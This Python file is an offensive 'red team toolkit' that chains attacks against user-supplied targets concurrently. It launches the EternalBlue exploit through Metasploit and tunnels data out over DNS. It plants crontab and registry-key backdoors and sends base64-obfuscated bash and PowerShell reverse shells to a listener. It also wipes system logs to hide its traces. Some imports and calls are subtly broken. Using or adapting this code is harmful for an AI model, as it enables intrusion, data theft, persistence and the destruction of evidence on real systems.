import requests
import subprocess
import logging
import socket
import os
import random
import string
import time
import json
import threading
import base64
from urllib.parse import urlparse
from time import sleep
from hashlib import sha256
from cryptography.fernet import Fernet
import psutil
import re
from dns import resolver
from metasploit.msfrpc import MsfRpcClient

logging.basicConfig(level=logging.INFO)

class UnstoppableRedTeamToolkit:
    def __init__(self, target_url, use_proxy=False, proxy=None):
        self.target_url = target_url
        self.use_proxy = use_proxy
        self.proxy = proxy
        self.session = requests.Session()
        self.setup_proxy()
        self.target_ip = self.resolve_ip(target_url)
        self.protocol, self.domain = self.detect_protocol(target_url)
        self.is_https = self.protocol == 'https'
        self.random_salt = self.get_random_string(32)
        self.fernet_key = Fernet.generate_key()

        # Metasploit client setup
        self.client = MsfRpcClient('yourpassword', server='127.0.0.1', port=55553)

    def setup_proxy(self):
        """Set up proxy configurations."""
        if self.use_proxy and self.proxy:
            if not self.is_valid_proxy(self.proxy):
                logging.error(f"Invalid proxy URL: {self.proxy}")
                return
            self.session.proxies = {
                'http': self.proxy,
                'https': self.proxy
            }
        elif self.use_proxy:
            self.session.proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }

    def is_valid_proxy(self, proxy):
        """Check if the proxy URL is valid."""
        try:
            result = urlparse(proxy)
            return result.scheme in ['http', 'https', 'socks5', 'socks5h']
        except Exception:
            return False

    def resolve_ip(self, target):
        try:
            parsed_url = urlparse(target)
            if parsed_url.hostname:
                return socket.gethostbyname(parsed_url.hostname)
            else:
                return target
        except Exception as e:
            logging.error(f"Error resolving IP for {target}: {e}")
            return None

    def detect_protocol(self, url):
        parsed_url = urlparse(url)
        if parsed_url.scheme == '':
            parsed_url = urlparse('http://' + url)
        return parsed_url.scheme, parsed_url.netloc

    def send_request(self, url, params=None, method="GET", headers=None):
        try:
            headers = headers or {}
            logging.debug(f"Sending {method} request to {url}")
            if method.upper() == "GET":
                response = self.session.get(url, params=params, headers=headers, timeout=10)
            elif method.upper() == "POST":
                response = self.session.post(url, data=params, headers=headers, timeout=10)
            elif method.upper() == "PUT":
                response = self.session.put(url, data=params, headers=headers, timeout=10)
            else:
                logging.error("Unsupported HTTP method")
                return None
            response.raise_for_status()  # Raise exception for 4xx/5xx responses
            return response
        except requests.RequestException as e:
            logging.error(f"Request failed: {e}")
            return None

    def metasploit_exploit(self, target_ip):
        """Integrate Metasploit to exploit vulnerabilities."""
        try:
            exploit = self.client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')  # Example exploit
            exploit['RHOSTS'] = target_ip
            exploit.execute()
            logging.info(f"Exploit {exploit.name} executed on {target_ip}")
        except Exception as e:
            logging.error(f"Metasploit exploit failed: {e}")

    def exfiltrate_data_via_dns(self, data, domain='example.com'):
        """Use DNS tunneling to exfiltrate data."""
        chunks = [data[i:i+255] for i in range(0, len(data), 255)]
        for chunk in chunks:
            subdomain = f"{chunk}.{domain}"
            retries = 3
            while retries > 0:
                try:
                    dns.resolver.resolve(subdomain, 'A')
                    logging.info(f"Data chunk sent: {subdomain}")
                    break
                except Exception as e:
                    logging.warning(f"Error during DNS exfiltration: {e}, retrying...")
                    retries -= 1
                    if retries == 0:
                        logging.error(f"Failed to send data chunk {subdomain} after retries.")
                    time.sleep(1)

    def bypass_firewall_while_attacking(self):
        """Evade detection by bypassing firewall."""
        headers = {'X-Forwarded-For': self.get_random_ip()}
        response = self.send_request(self.target_url, headers=headers)
        if response:
            logging.info("Bypassed firewall and successfully accessed the target.")
        else:
            logging.error("Failed to bypass firewall.")

    def get_random_ip(self):
        """Generate a random spoofed IP address."""
        return '.'.join([str(random.randint(1, 255)) for _ in range(4)])

    def maintain_persistence(self):
        """Create persistence mechanism."""
        if os.name == 'posix':
            subprocess.call('crontab -l | { cat; echo "*/5 * * * * /bin/bash /tmp/reverse_shell.sh"; } | crontab -', shell=True)
        elif os.name == 'nt':
            subprocess.call('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Backdoor" /t REG_SZ /d "C:\\backdoor\\reverse_shell.bat"', shell=True)

    def create_reverse_shell(self, listener_ip, listener_port, shell_type="bash"):
        """Create and execute reverse shell."""
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1",
            "powershell": f"powershell -nop -exec bypass -c $client = New-Object System.Net.Sockets.TCPClient('{listener_ip}',{listener_port});$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object Text.Encoding.ASCII).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length)}}",
        }
        reverse_shell_payload = payloads.get(shell_type)
        if not reverse_shell_payload:
            logging.error(f"Unsupported shell type: {shell_type}")
            return

        encoded_payload = base64.b64encode(reverse_shell_payload.encode()).decode()
        obfuscated_payload = f"echo {encoded_payload} | base64 --decode | bash"
        response = self.send_request(f"{self.target_url}?cmd={obfuscated_payload}")
        if response:
            logging.info(f"Reverse shell executed, connected back to {listener_ip}:{listener_port}.")
        else:
            logging.error("Reverse shell execution failed.")

    def clear_logs(self):
        """Clear logs to hide traces of attack."""
        try:
            if os.name == 'posix':
                subprocess.call("rm -rf /var/log/*", shell=True)
            elif os.name == 'nt':
                subprocess.call('del /q /f %SystemRoot%\\*.log', shell=True)
        except Exception as e:
            logging.error(f"Error clearing logs: {e}")

    def autonomous_attack_execution(self):
        """Fully automated attack execution from scan to exploit."""
        logging.info(f"Running full attack sequence against {self.target_url}...")
        self.metasploit_exploit(self.target_ip)
        self.bypass_firewall_while_attacking()
        self.maintain_persistence()
        self.create_reverse_shell("192.168.1.100", "4444")
        self.clear_logs()

    def run_attack(self, target_url):
        """Run attack on a single target."""
        self.target_url = target_url
        self.autonomous_attack_execution()

    def run(self, target_urls):
        """Run attacks on multiple targets concurrently."""
        threads = []
        for target_url in target_urls:
            thread = threading.Thread(target=self.run_attack, args=(target_url,))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    def get_random_string(self, length=32):
        """Generate a random string of fixed length."""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def generate_report(self, attack_data):
        """Generate a detailed attack report."""
        report = {
            "target": self.target_url,
            "attack_steps": attack_data['steps'],
            "successful_exploits": attack_data['successful_exploits'],
            "data_exfiltrated": attack_data['data_exfiltrated'],
            "time_taken": attack_data['time_taken']
        }
        with open("attack_report.json", "w") as report_file:
            json.dump(report, report_file, indent=4)
        logging.info("Report generated: attack_report.json")

if __name__ == "__main__":
    target_urls = input("Enter the target URLs (comma separated): ").strip().split(',')
    use_proxy = input("Use proxy (yes/no)? ").lower() == 'yes'
    proxy = None
    if use_proxy:
        proxy = input("Enter proxy URL (http://proxy.com): ").strip()

    if not target_urls:
        logging.error("At least one target URL is required.")
    else:
        toolkit = UnstoppableRedTeamToolkit(target_urls[0], use_proxy, proxy)
        toolkit.run(target_urls)
